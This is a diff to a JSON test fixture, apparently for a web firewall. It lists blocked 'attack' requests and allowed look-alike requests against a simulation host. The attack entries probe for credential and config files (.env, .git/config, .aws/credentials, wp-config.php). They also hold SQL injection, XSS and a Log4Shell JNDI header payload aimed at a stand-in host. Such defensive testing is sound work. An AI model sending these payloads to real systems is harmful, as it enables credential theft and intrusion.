@@ -1,14 +1,173 @@
 [
   {
-    "name": "blocked-marker",
+    "name": "blocked-env",
     "kind": "attack",
-    "url": "https://simulation.test/api?edge_shield_probe=block",
+    "url": "https://simulation.test/.env",
     "expectedStatus": 403
   },
   {
-    "name": "allowed-marker",
+    "name": "blocked-git",
+    "kind": "attack",
+    "url": "https://simulation.test/.git/config",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-svn",
+    "kind": "attack",
+    "url": "https://simulation.test/.svn/entries",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-hg",
+    "kind": "attack",
+    "url": "https://simulation.test/.hg/hgrc",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-wp",
+    "kind": "attack",
+    "url": "https://simulation.test/wp-config.php",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-aws",
+    "kind": "attack",
+    "url": "https://simulation.test/.aws/credentials",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-docker",
+    "kind": "attack",
+    "url": "https://simulation.test/.docker/config.json",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-actuator",
+    "kind": "attack",
+    "url": "https://simulation.test/actuator/env",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-pprof",
+    "kind": "attack",
+    "url": "https://simulation.test/debug/pprof/",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-server",
+    "kind": "attack",
+    "url": "https://simulation.test/server-status",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-phpunit",
+    "kind": "attack",
+    "url": "https://simulation.test/vendor/phpunit/phpunit/src/util/php/eval-stdin.php",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-dsstore",
+    "kind": "attack",
+    "url": "https://simulation.test/.DS_Store",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-union",
+    "kind": "attack",
+    "url": "https://simulation.test/api?q=1%20UNION%20SELECT%20email%20FROM%20users",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-sleep",
+    "kind": "attack",
+    "url": "https://simulation.test/api?id=1%20AND%20SLEEP(5)",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-xss",
+    "kind": "attack",
+    "url": "https://simulation.test/api?search=%3Cscript%3Ealert(1)%3C/script%3E",
+    "expectedStatus": 403
+  },
+  {
+    "name": "blocked-jndi",
+    "kind": "attack",
+    "url": "https://simulation.test/api",
+    "headers": {
+      "user-agent": "Mozilla/5.0 ${jndi:ldap://example.test/a}"
+    },
+    "expectedStatus": 403
+  },
+  {
+    "name": "legitimate-1",
     "kind": "legitimate",
-    "url": "https://simulation.test/api?edge_shield_probe=allow",
+    "url": "https://simulation.test/api?q=select%20from%20report",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-2",
+    "kind": "legitimate",
+    "url": "https://simulation.test/api?search=%3Csection%3Ehello%3C/section%3E",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-3",
+    "kind": "legitimate",
+    "url": "https://simulation.test/actuator/health",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-4",
+    "kind": "legitimate",
+    "url": "https://simulation.test/.well-known/security.txt",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-5",
+    "kind": "legitimate",
+    "url": "https://simulation.test/files/report.env.json",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-6",
+    "kind": "legitimate",
+    "url": "https://simulation.test/wp-content/themes/theme.css",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-7",
+    "kind": "legitimate",
+    "url": "https://simulation.test/debug/help",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-8",
+    "kind": "legitimate",
+    "url": "https://simulation.test/api?id=12345",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-9",
+    "kind": "legitimate",
+    "url": "https://simulation.test/.github/SECURITY.md",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-10",
+    "kind": "legitimate",
+    "url": "https://simulation.test/server-status-info",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-11",
+    "kind": "legitimate",
+    "url": "https://simulation.test/api?url=https%3A%2F%2Fexample.test%2Fdocs",
+    "expectedStatus": 204
+  },
+  {
+    "name": "legitimate-12",
+    "kind": "legitimate",
+    "url": "https://simulation.test/api?q=union%20members",
     "expectedStatus": 204
   }
 ]
